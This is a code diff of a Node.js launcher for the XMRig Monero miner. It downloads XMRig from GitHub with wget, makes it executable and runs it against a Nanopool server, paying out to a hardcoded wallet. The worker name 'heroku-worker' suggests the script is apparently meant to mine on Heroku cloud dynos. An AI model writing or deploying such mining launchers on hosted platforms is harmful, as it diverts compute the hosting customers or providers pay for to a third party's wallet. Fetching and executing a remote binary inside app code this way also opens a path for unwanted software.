@@ -1,56 +1,59 @@
-const { spawn } = require('child_process');
+const { spawn, execSync } = require('child_process');
+const fs = require('fs');
 const path = require('path');
 
-// Settings for Nanopool
-const pool = 'xmr-eu1.nanopool.org:14444'; // Change server if needed
-const wallet = '48ahQdgq3V2Vtoh6We2sM1YH6BSQxH4m9T4G38AJkubkYZBxye2B9kWgCHTEYiq5Wyb52xjTYY4CAie75T41iCr91gGZ9UP';
-const workerName = 'heroku-worker';
-const email = 'your@email.com'; // Optional: you can leave empty or use your email
+const minerUrl = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz';
+const minerTar = 'xmrig.tar.gz';
+const minerFolder = 'xmrig-6.21.0';
 
-// Full path to xmrig binary (adjust if needed)
-const xmrigPath = path.join(__dirname, 'xmrig');
+async function downloadXmrig() {
+  if (!fs.existsSync('./xmrig')) {
+    console.log('[*] XMRig not found. Downloading...');
 
-// Miner options
-const xmrigArgs = [
-  '-o', pool,
-  '-u', `${wallet}.${workerName}/${email}`,
-  '-p', 'x', // Password is usually just "x"
-  '--donate-level=1',
-  '--cpu-priority=5',
-  '--max-cpu-usage=75'
-];
-
-// Simple logger with timestamps
-function log(message) {
-  console.log(`[${new Date().toISOString()}] ${message}`);
+    try {
+      execSync(`wget -O ${minerTar} ${minerUrl}`);
+      execSync(`tar -xzf ${minerTar}`);
+      execSync(`mv ${minerFolder}/xmrig ./xmrig`);
+      execSync(`chmod +x ./xmrig`);
+      execSync(`rm -rf ${minerTar} ${minerFolder}`);
+      console.log('[*] XMRig downloaded and ready.');
+    } catch (err) {
+      console.error('Failed to download or setup XMRig:', err);
+      process.exit(1);
+    }
+  }
 }
 
-// Function to start mining
-function startMiner() {
-  log('Starting XMRig...');
+async function startMining() {
+  console.log('[*] Starting XMRig...');
   
-  const miner = spawn(xmrigPath, xmrigArgs);
+  const pool = 'xmr-eu1.nanopool.org:14444';
+  const wallet = '48ahQdgq3V2Vtoh6We2sM1YH6BSQxH4m9T4G38AJkubkYZBxye2B9kWgCHTEYiq5Wyb52xjTYY4CAie75T41iCr91gGZ9UP';
+  const workerName = 'heroku-worker';
 
-  miner.stdout.on('data', (data) => {
-    process.stdout.write(`[XMRig STDOUT] ${data}`);
+  const xmrig = spawn('./xmrig', [
+    '-o', pool,
+    '-u', `${wallet}.${workerName}/your@email.com`,
+    '-p', 'x',
+    '--donate-level=1',
+    '--cpu-priority=5',
+    '--max-cpu-usage=75'
+  ]);
+
+  xmrig.stdout.on('data', (data) => {
+    console.log(`xmrig: ${data}`);
   });
 
-  miner.stderr.on('data', (data) => {
-    process.stderr.write(`[XMRig STDERR] ${data}`);
+  xmrig.stderr.on('data', (data) => {
+    console.error(`xmrig error: ${data}`);
   });
 
-  miner.on('close', (code) => {
-    log(`XMRig exited with code ${code}. Restarting in 5 seconds...`);
-    setTimeout(startMiner, 5000); // Auto-restart after 5 seconds
-  });
-
-  // Graceful shutdown
-  process.on('SIGINT', () => {
-    log('Stopping miner...');
-    miner.kill('SIGINT');
-    process.exit();
+  xmrig.on('close', (code) => {
+    console.log(`xmrig process exited with code ${code}`);
   });
 }
 
-// Start the miner
-startMiner();
+(async () => {
+  await downloadXmrig();
+  startMining();
+})();
